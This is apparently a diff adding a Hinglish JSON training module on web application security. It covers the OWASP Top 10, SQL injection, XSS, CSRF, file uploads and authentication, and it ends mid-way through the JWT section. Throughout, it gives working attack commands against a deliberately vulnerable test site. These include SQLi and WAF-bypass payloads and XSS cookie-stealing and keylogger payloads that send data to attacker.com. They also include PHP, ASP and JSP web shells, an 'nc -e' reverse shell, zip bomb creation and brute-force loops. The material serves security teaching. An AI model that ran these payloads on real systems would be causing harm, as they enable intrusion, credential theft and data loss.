@@ -1,0 +1,655 @@
+{
+  "moduleTitle": "Module 6: Web Application Security",
+  "moduleDescription": "Complete web application security testing - OWASP Top 10, SQL Injection, XSS, CSRF aur advanced web attack techniques",
+  "lessons": [
+    {
+      "id": 1,
+      "title": "Web Application Security Fundamentals",
+      "content": {
+        "intro": "Web application security ki foundation - HTTP protocol, web architecture aur common security concepts samajhna zaroori hai.",
+        "sections": [
+          {
+            "heading": "Web Application Architecture",
+            "text": "Modern Web Application Components:\n\n• Client-side (Frontend)\n  - HTML, CSS, JavaScript\n  - Browser security model\n  - Same-origin policy\n\n• Server-side (Backend)\n  - Web server (Apache, Nginx)\n  - Application server\n  - Database server\n\n• Communication Layer\n  - HTTP/HTTPS protocol\n  - RESTful APIs\n  - WebSocket connections"
+          },
+          {
+            "heading": "HTTP Protocol Deep Dive",
+            "text": "HTTP Request Structure:\n\nGET /login.php HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0...\nCookie: sessionid=abc123\nAuthorization: Bearer token\n\nHTTP Response Structure:\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: sessionid=xyz789\nX-Frame-Options: DENY\n\n<html>...</html>",
+            "commands": [
+              {
+                "description": "HTTP Request with Curl",
+                "command": "curl -v -H 'User-Agent: Neuro-Dev-Scanner' http://testphp.vulnweb.com",
+                "explanation": "HTTP request headers aur response analyze karta hai"
+              },
+              {
+                "description": "HTTP Methods Test",
+                "command": "curl -X OPTIONS http://testphp.vulnweb.com -v",
+                "explanation": "Allowed HTTP methods check karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Web Security Concepts",
+            "text": "Core Security Principles:\n\n• Authentication - User identity verification\n• Authorization - Access control\n• Session Management - User state tracking\n• Input Validation - Data sanitization\n• Output Encoding - XSS prevention\n• Cryptography - Data protection\n\nCommon Attack Vectors:\n• Injection attacks\n• Broken authentication\n• Sensitive data exposure\n• XML external entities\n• Broken access control\n• Security misconfiguration\n• Cross-site scripting\n• Insecure deserialization\n• Known vulnerabilities\n• Insufficient logging"
+          },
+          {
+            "heading": "Web Testing Tools Setup",
+            "commands": [
+              {
+                "description": "Burp Suite Community",
+                "command": "apt install burpsuite -y",
+                "explanation": "Web application security testing platform"
+              },
+              {
+                "description": "OWASP ZAP",
+                "command": "apt install zaproxy -y",
+                "explanation": "Free web application security scanner"
+              },
+              {
+                "description": "Nikto Web Scanner",
+                "command": "apt install nikto -y",
+                "explanation": "Web server vulnerability scanner"
+              },
+              {
+                "description": "Dirb Directory Brute Force",
+                "command": "apt install dirb -y",
+                "explanation": "Web directory brute force tool"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 2,
+      "title": "OWASP Top 10 - Part 1",
+      "content": {
+        "intro": "OWASP Top 10 2021 ke pehle 5 vulnerabilities - Injection, Broken Authentication, Sensitive Data Exposure, XXE, aur Broken Access Control.",
+        "sections": [
+          {
+            "heading": "A01: Broken Access Control",
+            "text": "Access Control Failures:\n\n• Vertical privilege escalation\n• Horizontal privilege escalation\n• Missing function level access control\n• Insecure direct object references\n• CORS misconfiguration\n\nCommon Examples:\n• /admin panel accessible to normal users\n• User can access other user's data\n• API endpoints without proper authorization\n• File path traversal attacks",
+            "commands": [
+              {
+                "description": "Directory Traversal Test",
+                "command": "curl 'http://testphp.vulnweb.com/showimage.php?file=../../../etc/passwd'",
+                "explanation": "Path traversal vulnerability test karta hai"
+              },
+              {
+                "description": "Forced Browsing",
+                "command": "dirb http://testphp.vulnweb.com /usr/share/dirb/wordlists/common.txt",
+                "explanation": "Hidden directories aur files find karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "A02: Cryptographic Failures",
+            "text": "Sensitive Data Exposure Issues:\n\n• Weak encryption algorithms\n• Poor key management\n• Data transmitted in clear text\n• Weak hashing functions\n• Missing encryption\n\nData at Risk:\n• Passwords\n• Credit card numbers\n• Personal information\n• Authentication tokens\n• Private keys",
+            "commands": [
+              {
+                "description": "SSL/TLS Analysis",
+                "command": "nmap --script ssl-enum-ciphers -p 443 google.com",
+                "explanation": "SSL/TLS configuration aur cipher suites check karta hai"
+              },
+              {
+                "description": "HTTP vs HTTPS Check",
+                "command": "curl -I http://testphp.vulnweb.com",
+                "explanation": "HTTP headers mein security headers check karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "A03: Injection",
+            "text": "Injection Attack Types:\n\n• SQL Injection\n• NoSQL Injection\n• OS Command Injection\n• LDAP Injection\n• XPath Injection\n\nSQL Injection Examples:\n• ' OR '1'='1\n• '; DROP TABLE users; --\n• UNION SELECT username,password FROM users\n• ' AND (SELECT COUNT(*) FROM users) > 0 --",
+            "commands": [
+              {
+                "description": "Basic SQL Injection Test",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1' OR '1'='1\"",
+                "explanation": "Simple SQL injection vulnerability test karta hai"
+              },
+              {
+                "description": "Sqlmap Automated Test",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --batch",
+                "explanation": "Automated SQL injection testing tool"
+              }
+            ]
+          },
+          {
+            "heading": "A04: Insecure Design",
+            "text": "Design Flaws:\n\n• Missing security controls\n• Ineffective security controls\n• Missing threat modeling\n• Insecure architecture patterns\n\nSecure Design Principles:\n• Defense in depth\n• Fail securely\n• Least privilege\n• Separation of duties\n• Zero trust architecture\n• Secure by default"
+          },
+          {
+            "heading": "A05: Security Misconfiguration",
+            "text": "Common Misconfigurations:\n\n• Default accounts enabled\n• Unnecessary features enabled\n• Missing security headers\n• Verbose error messages\n• Outdated software versions\n\nSecurity Headers:\n• X-Frame-Options\n• X-Content-Type-Options\n• X-XSS-Protection\n• Strict-Transport-Security\n• Content-Security-Policy",
+            "commands": [
+              {
+                "description": "Security Headers Check",
+                "command": "curl -I https://google.com | grep -E '(X-Frame|X-Content|X-XSS|Strict-Transport|Content-Security)'",
+                "explanation": "Security headers presence check karta hai"
+              },
+              {
+                "description": "Nikto Misconfiguration Scan",
+                "command": "nikto -h http://testphp.vulnweb.com",
+                "explanation": "Web server misconfigurations scan karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 3,
+      "title": "OWASP Top 10 - Part 2",
+      "content": {
+        "intro": "OWASP Top 10 ke remaining 5 vulnerabilities - Vulnerable Components, Identification Failures, Logging Failures, SSRF, aur Software Integrity Failures.",
+        "sections": [
+          {
+            "heading": "A06: Vulnerable and Outdated Components",
+            "text": "Component Vulnerabilities:\n\n• Outdated libraries\n• Unpatched frameworks\n• Vulnerable dependencies\n• End-of-life software\n• Unknown component inventory\n\nRisk Factors:\n• Third-party libraries\n• JavaScript frameworks\n• Server software\n• Operating system\n• Database systems",
+            "commands": [
+              {
+                "description": "Technology Detection",
+                "command": "whatweb http://testphp.vulnweb.com",
+                "explanation": "Website technologies aur versions identify karta hai"
+              },
+              {
+                "description": "Wappalyzer CLI",
+                "command": "npm install -g wappalyzer-cli && wappalyzer http://testphp.vulnweb.com",
+                "explanation": "Web technologies fingerprinting tool"
+              }
+            ]
+          },
+          {
+            "heading": "A07: Identification and Authentication Failures",
+            "text": "Authentication Weaknesses:\n\n• Weak password policies\n• Missing multi-factor authentication\n• Session fixation\n• Credential stuffing\n• Brute force attacks\n\nSession Management Issues:\n• Predictable session IDs\n• Session not invalidated\n• Session timeout issues\n• Insecure session storage",
+            "commands": [
+              {
+                "description": "Brute Force Attack",
+                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
+                "explanation": "Login brute force attack simulate karta hai"
+              },
+              {
+                "description": "Session Analysis",
+                "command": "curl -c cookies.txt -b cookies.txt http://testphp.vulnweb.com/login.php",
+                "explanation": "Session cookies analyze karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "A08: Software and Data Integrity Failures",
+            "text": "Integrity Issues:\n\n• Unsigned software updates\n• Insecure CI/CD pipelines\n• Auto-update without verification\n• Untrusted repositories\n• Deserialization vulnerabilities\n\nDeserialization Attacks:\n• Object injection\n• Remote code execution\n• Privilege escalation\n• Data tampering"
+          },
+          {
+            "heading": "A09: Security Logging and Monitoring Failures",
+            "text": "Logging Deficiencies:\n\n• Missing audit logs\n• Insufficient log details\n• Logs not monitored\n• No alerting system\n• Log tampering possible\n\nWhat to Log:\n• Authentication attempts\n• Authorization failures\n• Input validation failures\n• Application errors\n• Security events",
+            "commands": [
+              {
+                "description": "Log Analysis",
+                "command": "tail -f /var/log/apache2/access.log | grep -E '(40[0-9]|50[0-9])'",
+                "explanation": "Web server error logs monitor karta hai"
+              },
+              {
+                "description": "Failed Login Detection",
+                "command": "grep 'Failed password' /var/log/auth.log | tail -10",
+                "explanation": "Failed authentication attempts check karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "A10: Server-Side Request Forgery (SSRF)",
+            "text": "SSRF Attack Scenarios:\n\n• Internal network scanning\n• Cloud metadata access\n• File system access\n• Database connections\n• Service enumeration\n\nSSRF Payloads:\n• http://localhost:22\n• http://169.254.169.254/\n• file:///etc/passwd\n• gopher://internal-host:6379/",
+            "commands": [
+              {
+                "description": "SSRF Test",
+                "command": "curl 'http://vulnerable-app.com/fetch?url=http://localhost:22'",
+                "explanation": "SSRF vulnerability test karta hai"
+              },
+              {
+                "description": "Cloud Metadata Access",
+                "command": "curl 'http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/'",
+                "explanation": "Cloud instance metadata access attempt"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 4,
+      "title": "SQL Injection Deep Dive",
+      "content": {
+        "intro": "SQL Injection attacks ki complete understanding - detection, exploitation, aur advanced techniques.",
+        "sections": [
+          {
+            "heading": "SQL Injection Types",
+            "text": "SQL Injection Categories:\n\n1. In-band SQL Injection\n   • Error-based\n   • Union-based\n\n2. Inferential SQL Injection\n   • Boolean-based blind\n   • Time-based blind\n\n3. Out-of-band SQL Injection\n   • DNS exfiltration\n   • HTTP requests\n\nCommon Injection Points:\n• GET parameters\n• POST data\n• HTTP headers\n• Cookies\n• File uploads"
+          },
+          {
+            "heading": "Manual SQL Injection Testing",
+            "commands": [
+              {
+                "description": "Basic Error Testing",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1'\"",
+                "explanation": "Single quote se SQL error generate karta hai"
+              },
+              {
+                "description": "Boolean-based Test",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 AND 1=1\"",
+                "explanation": "Boolean condition se response difference check karta hai"
+              },
+              {
+                "description": "Union-based Test",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3\"",
+                "explanation": "Union query se column count determine karta hai"
+              },
+              {
+                "description": "Time-based Blind Test",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 AND SLEEP(5)\"",
+                "explanation": "Time delay se blind SQL injection test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Database Fingerprinting",
+            "text": "Database-specific Payloads:\n\nMySQL:\n• SELECT VERSION()\n• SELECT USER()\n• SELECT DATABASE()\n• UNION SELECT 1,@@version,3\n\nPostgreSQL:\n• SELECT version()\n• SELECT current_user\n• SELECT current_database()\n\nMicrosoft SQL Server:\n• SELECT @@version\n• SELECT SYSTEM_USER\n• SELECT DB_NAME()\n\nOracle:\n• SELECT banner FROM v$version\n• SELECT user FROM dual",
+            "commands": [
+              {
+                "description": "MySQL Version Detection",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,@@version,3\"",
+                "explanation": "MySQL database version extract karta hai"
+              },
+              {
+                "description": "Database Name Extraction",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,database(),3\"",
+                "explanation": "Current database name extract karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Advanced SQL Injection Techniques",
+            "commands": [
+              {
+                "description": "WAF Bypass - Comment",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1/**/UNION/**/SELECT/**/1,2,3\"",
+                "explanation": "Comments use kar ke WAF bypass karta hai"
+              },
+              {
+                "description": "WAF Bypass - Case Variation",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1 uNiOn sElEcT 1,2,3\"",
+                "explanation": "Case variation se WAF bypass attempt"
+              },
+              {
+                "description": "WAF Bypass - Encoding",
+                "command": "curl \"http://testphp.vulnweb.com/artists.php?artist=1%20UNION%20SELECT%201,2,3\"",
+                "explanation": "URL encoding se WAF bypass karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Sqlmap Advanced Usage",
+            "commands": [
+              {
+                "description": "Comprehensive Scan",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs --tables --columns --dump",
+                "explanation": "Complete database structure aur data extract karta hai"
+              },
+              {
+                "description": "POST Request Testing",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/search.php' --data='searchFor=test' --dbs",
+                "explanation": "POST parameters mein SQL injection test karta hai"
+              },
+              {
+                "description": "Cookie-based Testing",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/' --cookie='id=1*' --level=2",
+                "explanation": "Cookie parameters test karta hai"
+              },
+              {
+                "description": "WAF Detection & Bypass",
+                "command": "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --identify-waf --tamper=space2comment",
+                "explanation": "WAF detect kar ke bypass techniques use karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 5,
+      "title": "Cross-Site Scripting (XSS)",
+      "content": {
+        "intro": "XSS attacks ki complete understanding - types, detection, exploitation aur prevention techniques.",
+        "sections": [
+          {
+            "heading": "XSS Attack Types",
+            "text": "XSS Categories:\n\n1. Reflected XSS (Non-persistent)\n   • URL parameters\n   • Form inputs\n   • HTTP headers\n   • Immediate execution\n\n2. Stored XSS (Persistent)\n   • Database storage\n   • Comment sections\n   • User profiles\n   • Affects multiple users\n\n3. DOM-based XSS\n   • Client-side JavaScript\n   • URL fragments\n   • Local storage\n   • No server involvement"
+          },
+          {
+            "heading": "Basic XSS Payloads",
+            "text": "Simple XSS Payloads:\n\n• <script>alert('XSS')</script>\n• <img src=x onerror=alert('XSS')>\n• <svg onload=alert('XSS')>\n• javascript:alert('XSS')\n• <iframe src=javascript:alert('XSS')>\n\nAdvanced Payloads:\n• <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>\n• <script>new Image().src='http://attacker.com/log.php?data='+btoa(document.body.innerHTML)</script>",
+            "commands": [
+              {
+                "description": "Reflected XSS Test",
+                "command": "curl \"http://testphp.vulnweb.com/search.php?test=<script>alert('XSS')</script>\"",
+                "explanation": "Reflected XSS vulnerability test karta hai"
+              },
+              {
+                "description": "XSS in Headers",
+                "command": "curl -H \"User-Agent: <script>alert('XSS')</script>\" http://testphp.vulnweb.com",
+                "explanation": "HTTP headers mein XSS test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "XSS Filter Bypass Techniques",
+            "text": "Filter Bypass Methods:\n\n• Case variation: <ScRiPt>\n• Encoding: %3Cscript%3E\n• HTML entities: &lt;script&gt;\n• Unicode encoding: \\u003cscript\\u003e\n• Event handlers: onmouseover=alert(1)\n• JavaScript pseudo-protocol: javascript:\n• Data URIs: data:text/html,<script>alert(1)</script>\n\nAdvanced Bypass:\n• <svg/onload=alert(1)>\n• <img src=/ onerror=alert(1)>\n• <details open ontoggle=alert(1)>\n• <marquee onstart=alert(1)>",
+            "commands": [
+              {
+                "description": "Encoded XSS Payload",
+                "command": "curl \"http://testphp.vulnweb.com/search.php?test=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E\"",
+                "explanation": "URL encoded XSS payload test karta hai"
+              },
+              {
+                "description": "Event Handler XSS",
+                "command": "curl \"http://testphp.vulnweb.com/search.php?test=<img src=x onerror=alert(1)>\"",
+                "explanation": "Event handler based XSS test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "XSS Exploitation Techniques",
+            "text": "XSS Attack Scenarios:\n\n1. Session Hijacking\n   • Cookie theft\n   • Session token extraction\n   • Account takeover\n\n2. Phishing Attacks\n   • Fake login forms\n   • Credential harvesting\n   • Social engineering\n\n3. Malware Distribution\n   • Drive-by downloads\n   • Browser exploitation\n   • Payload delivery\n\n4. Defacement\n   • Content modification\n   • Reputation damage\n   • Brand impact",
+            "commands": [
+              {
+                "description": "Cookie Stealing Payload",
+                "command": "echo \"<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>\"",
+                "explanation": "Cookie theft payload example (educational purpose)"
+              },
+              {
+                "description": "Keylogger Payload",
+                "command": "echo \"<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log.php?key='+String.fromCharCode(e.which)}</script>\"",
+                "explanation": "Keylogger XSS payload example"
+              }
+            ]
+          },
+          {
+            "heading": "XSS Detection Tools",
+            "commands": [
+              {
+                "description": "XSSer Tool",
+                "command": "apt install xsser -y && xsser -u 'http://testphp.vulnweb.com/search.php?test=XSS'",
+                "explanation": "Automated XSS detection tool"
+              },
+              {
+                "description": "Dalfox XSS Scanner",
+                "command": "go install github.com/hahwul/dalfox/v2@latest && dalfox url http://testphp.vulnweb.com",
+                "explanation": "Modern XSS scanner tool"
+              },
+              {
+                "description": "XSS Payloads List",
+                "command": "wget https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
+                "explanation": "XSS payloads wordlist download karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 6,
+      "title": "Cross-Site Request Forgery (CSRF)",
+      "content": {
+        "intro": "CSRF attacks - user ke authenticated session abuse kar ke unauthorized actions perform karna.",
+        "sections": [
+          {
+            "heading": "CSRF Attack Mechanism",
+            "text": "CSRF Attack Process:\n\n1. User logs into vulnerable website\n2. User visits attacker's malicious site\n3. Malicious site sends forged request\n4. Browser includes authentication cookies\n5. Vulnerable site processes request\n6. Unauthorized action completed\n\nCSRF Requirements:\n• User must be authenticated\n• Predictable request parameters\n• No CSRF protection mechanism\n• Social engineering component"
+          },
+          {
+            "heading": "CSRF Attack Examples",
+            "text": "HTML Form-based CSRF:\n\n<form action=\"http://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000\">\n  <input type=\"submit\" value=\"Click Here!\">\n</form>\n\nJavaScript-based CSRF:\n\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', 'http://bank.com/transfer');\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('to=attacker&amount=1000');\n</script>\n\nImage-based CSRF:\n\n<img src=\"http://bank.com/transfer?to=attacker&amount=1000\">"
+          },
+          {
+            "heading": "CSRF Detection Techniques",
+            "commands": [
+              {
+                "description": "CSRF Token Check",
+                "command": "curl -c cookies.txt -b cookies.txt -X POST http://testphp.vulnweb.com/login.php -d 'username=admin&password=admin'",
+                "explanation": "Login kar ke session establish karta hai"
+              },
+              {
+                "description": "Form Analysis",
+                "command": "curl -b cookies.txt http://testphp.vulnweb.com/profile.php | grep -i 'csrf\\|token'",
+                "explanation": "Forms mein CSRF tokens check karta hai"
+              },
+              {
+                "description": "Cross-origin Request Test",
+                "command": "curl -H 'Origin: http://evil.com' -X POST http://testphp.vulnweb.com/update.php -d 'email=hacker@evil.com'",
+                "explanation": "Cross-origin request attempt karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "CSRF Exploitation",
+            "text": "CSRF Exploit Development:\n\n1. Target Function Identification\n   • Password change\n   • Email update\n   • Money transfer\n   • Account deletion\n\n2. Request Analysis\n   • HTTP method\n   • Parameters\n   • Headers\n   • Authentication\n\n3. Exploit Creation\n   • HTML forms\n   • JavaScript\n   • Image tags\n   • AJAX requests\n\n4. Social Engineering\n   • Email phishing\n   • Malicious websites\n   • Social media links",
+            "commands": [
+              {
+                "description": "CSRF PoC Generator",
+                "command": "echo '<form action=\"http://target.com/change-password\" method=\"POST\"><input name=\"password\" value=\"hacked123\"><input type=\"submit\"></form>' > csrf_poc.html",
+                "explanation": "CSRF proof of concept HTML file banata hai"
+              },
+              {
+                "description": "Auto-submit CSRF",
+                "command": "echo '<body onload=\"document.forms[0].submit()\"><form action=\"http://target.com/transfer\" method=\"POST\"><input name=\"amount\" value=\"1000\"></form></body>' > auto_csrf.html",
+                "explanation": "Auto-submitting CSRF exploit banata hai"
+              }
+            ]
+          },
+          {
+            "heading": "CSRF Protection Bypass",
+            "text": "CSRF Protection Mechanisms:\n\n• CSRF Tokens\n• SameSite Cookies\n• Referer Header Validation\n• Custom Headers\n• Double Submit Cookies\n\nBypass Techniques:\n\n1. Token Prediction\n   • Weak randomness\n   • Pattern analysis\n   • Brute force\n\n2. Token Leakage\n   • XSS vulnerabilities\n   • Referer header\n   • Browser history\n\n3. Validation Flaws\n   • Case sensitivity\n   • Empty token acceptance\n   • Wrong validation logic",
+            "commands": [
+              {
+                "description": "Token Extraction",
+                "command": "curl -b cookies.txt http://testphp.vulnweb.com/form.php | grep -o 'csrf_token\" value=\"[^\"]*' | cut -d'\"' -f3",
+                "explanation": "CSRF token extract karta hai"
+              },
+              {
+                "description": "Referer Bypass",
+                "command": "curl -H 'Referer: http://target.com' -X POST http://target.com/action -d 'data=value'",
+                "explanation": "Referer header spoofing attempt"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 7,
+      "title": "File Upload Vulnerabilities",
+      "content": {
+        "intro": "File upload vulnerabilities - malicious files upload kar ke remote code execution aur system compromise karna.",
+        "sections": [
+          {
+            "heading": "File Upload Attack Vectors",
+            "text": "Upload Vulnerability Types:\n\n1. Unrestricted File Upload\n   • No file type validation\n   • Direct execution possible\n   • Immediate RCE\n\n2. Insufficient Validation\n   • Client-side only checks\n   • MIME type spoofing\n   • Extension blacklist bypass\n\n3. Path Traversal\n   • Directory traversal\n   • Overwrite system files\n   • Arbitrary file placement\n\n4. Content-based Attacks\n   • Malicious content in images\n   • Polyglot files\n   • Embedded payloads"
+          },
+          {
+            "heading": "Malicious File Types",
+            "text": "Dangerous File Extensions:\n\n• Web Shells: .php, .asp, .jsp, .py\n• Executables: .exe, .bat, .sh, .com\n• Scripts: .js, .vbs, .ps1, .pl\n• Archives: .zip, .rar, .tar (zip bombs)\n• Documents: .pdf, .doc (macro viruses)\n\nWeb Shell Examples:\n\nPHP Web Shell:\n<?php system($_GET['cmd']); ?>\n\nASP Web Shell:\n<%eval request(\"cmd\")%>\n\nJSP Web Shell:\n<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+            "commands": [
+              {
+                "description": "Simple PHP Shell",
+                "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+                "explanation": "Basic PHP web shell create karta hai"
+              },
+              {
+                "description": "File Upload Test",
+                "command": "curl -F 'file=@shell.php' http://testphp.vulnweb.com/upload.php",
+                "explanation": "Malicious file upload attempt karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Bypass Techniques",
+            "text": "Extension Bypass Methods:\n\n• Double extensions: shell.php.jpg\n• Null byte injection: shell.php%00.jpg\n• Case variation: shell.PHP\n• Alternative extensions: .php3, .php4, .php5, .phtml\n• MIME type spoofing: Change Content-Type header\n• Magic bytes manipulation: Add image headers\n\nContent-Type Bypass:\n• image/jpeg for PHP files\n• text/plain for scripts\n• application/octet-stream\n\nMagic Bytes Examples:\n• JPEG: FF D8 FF E0\n• PNG: 89 50 4E 47\n• GIF: 47 49 46 38",
+            "commands": [
+              {
+                "description": "MIME Type Spoofing",
+                "command": "curl -F 'file=@shell.php;type=image/jpeg' http://testphp.vulnweb.com/upload.php",
+                "explanation": "MIME type spoofing kar ke upload attempt"
+              },
+              {
+                "description": "Magic Bytes Addition",
+                "command": "echo -e '\\xFF\\xD8\\xFF\\xE0\\x00\\x10JFIF\\x00\\x01<?php system($_GET[\"cmd\"]); ?>' > image_shell.php",
+                "explanation": "JPEG magic bytes ke saath PHP shell banata hai"
+              },
+              {
+                "description": "Double Extension Test",
+                "command": "cp shell.php shell.php.jpg && curl -F 'file=@shell.php.jpg' http://testphp.vulnweb.com/upload.php",
+                "explanation": "Double extension bypass attempt"
+              }
+            ]
+          },
+          {
+            "heading": "Advanced Upload Attacks",
+            "text": "Polyglot Files:\n• Valid image + executable code\n• PDF with embedded JavaScript\n• ZIP with malicious contents\n\nZip Bomb Attack:\n• Highly compressed malicious ZIP\n• Causes resource exhaustion\n• Denial of service\n\nPath Traversal:\n• ../../../etc/passwd\n• ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n• Overwrite configuration files",
+            "commands": [
+              {
+                "description": "Path Traversal Upload",
+                "command": "curl -F 'file=@shell.php' -F 'path=../../../var/www/html/' http://testphp.vulnweb.com/upload.php",
+                "explanation": "Path traversal se arbitrary location mein upload"
+              },
+              {
+                "description": "Zip Bomb Creation",
+                "command": "dd if=/dev/zero bs=1M count=1000 | gzip > bomb.gz",
+                "explanation": "Simple zip bomb create karta hai"
+              },
+              {
+                "description": "Polyglot File",
+                "command": "cat image.jpg shell.php > polyglot.jpg",
+                "explanation": "Image aur PHP code combine kar ke polyglot file banata hai"
+              }
+            ]
+          },
+          {
+            "heading": "Post-Upload Exploitation",
+            "commands": [
+              {
+                "description": "Web Shell Access",
+                "command": "curl 'http://testphp.vulnweb.com/uploads/shell.php?cmd=whoami'",
+                "explanation": "Uploaded web shell se command execution"
+              },
+              {
+                "description": "File Listing",
+                "command": "curl 'http://testphp.vulnweb.com/uploads/shell.php?cmd=ls -la'",
+                "explanation": "Server files list karta hai"
+              },
+              {
+                "description": "Reverse Shell",
+                "command": "curl 'http://testphp.vulnweb.com/uploads/shell.php?cmd=nc -e /bin/bash 192.168.1.100 4444'",
+                "explanation": "Reverse shell connection establish karta hai"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": 8,
+      "title": "Authentication & Session Management",
+      "content": {
+        "intro": "Authentication aur session management vulnerabilities - weak authentication, session hijacking, aur privilege escalation attacks.",
+        "sections": [
+          {
+            "heading": "Authentication Vulnerabilities",
+            "text": "Common Authentication Flaws:\n\n• Weak password policies\n• Default credentials\n• Brute force attacks\n• Credential stuffing\n• Password spraying\n• Multi-factor bypass\n• Account enumeration\n• Password reset flaws\n\nAuthentication Bypass Techniques:\n• SQL injection in login\n• NoSQL injection\n• LDAP injection\n• Authentication logic flaws\n• Race conditions\n• Time-based attacks"
+          },
+          {
+            "heading": "Brute Force Attacks",
+            "commands": [
+              {
+                "description": "Hydra HTTP Form Brute Force",
+                "command": "hydra -l <username> -P /usr/share/wordlists/rockyou.txt testphp.vulnweb.com http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
+                "explanation": "HTTP form brute force attack karta hai"
+              },
+              {
+                "description": "Medusa Brute Force",
+                "command": "medusa -h testphp.vulnweb.com -u <username> -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login.php",
+                "explanation": "Alternative brute force tool"
+              },
+              {
+                "description": "Custom Brute Force Script",
+                "command": "for pass in $(cat passwords.txt); do curl -d \"username=<username>&password=$pass\" http://testphp.vulnweb.com/login.php; done",
+                "explanation": "Simple bash brute force loop"
+              }
+            ]
+          },
+          {
+            "heading": "Session Management Flaws",
+            "text": "Session Vulnerabilities:\n\n• Predictable session IDs\n• Session fixation\n• Session hijacking\n• Insufficient session timeout\n• Session not invalidated on logout\n• Concurrent sessions allowed\n• Session data in URL\n• Weak session storage\n\nSession ID Analysis:\n• Randomness testing\n• Pattern identification\n• Entropy calculation\n• Collision detection\n• Timing analysis",
+            "commands": [
+              {
+                "description": "Session ID Analysis",
+                "command": "for i in {1..10}; do curl -c cookies$i.txt http://testphp.vulnweb.com/login.php; grep sessionid cookies$i.txt; done",
+                "explanation": "Multiple session IDs collect kar ke pattern analyze karta hai"
+              },
+              {
+                "description": "Session Fixation Test",
+                "command": "curl -H 'Cookie: PHPSESSID=attacker_controlled_session' http://testphp.vulnweb.com/login.php",
+                "explanation": "Session fixation vulnerability test karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Cookie Security Analysis",
+            "text": "Cookie Security Attributes:\n\n• HttpOnly - XSS protection\n• Secure - HTTPS only\n• SameSite - CSRF protection\n• Domain - Scope limitation\n• Path - URL path restriction\n• Expires/Max-Age - Lifetime control\n\nCookie Vulnerabilities:\n• Missing security flags\n• Overly broad domain\n• Long expiration time\n• Sensitive data in cookies\n• Predictable cookie values",
+            "commands": [
+              {
+                "description": "Cookie Analysis",
+                "command": "curl -I http://testphp.vulnweb.com/login.php | grep -i 'set-cookie'",
+                "explanation": "Cookie security attributes analyze karta hai"
+              },
+              {
+                "description": "Cookie Manipulation",
+                "command": "curl -H 'Cookie: role=<role>; userid=<id>' http://testphp.vulnweb.com/admin.php",
+                "explanation": "Cookie values manipulate kar ke privilege escalation attempt"
+              }
+            ]
+          },
+          {
+            "heading": "JWT (JSON Web Token) Attacks",
+            "text": "JWT Vulnerabilities:\n\n• Algorithm confusion (RS256 to HS256)\n• Weak signing keys\n• Missing signature verification\n• Key injection attacks\n• Claims manipulation\n• Timing attacks\n\nJWT Structure:\nheader.payload.signature\n\nCommon JWT Attacks:\n• None algorithm attack\n• Key confusion attack\n• Weak secret brute force\n• Claims tampering",
+            "commands": [
+              {
+                "description": "JWT Decode",
+                "command": "echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' | cut -d'.' -f2 | base64 -d",
+                "explanation": "JWT payload decode karta hai"
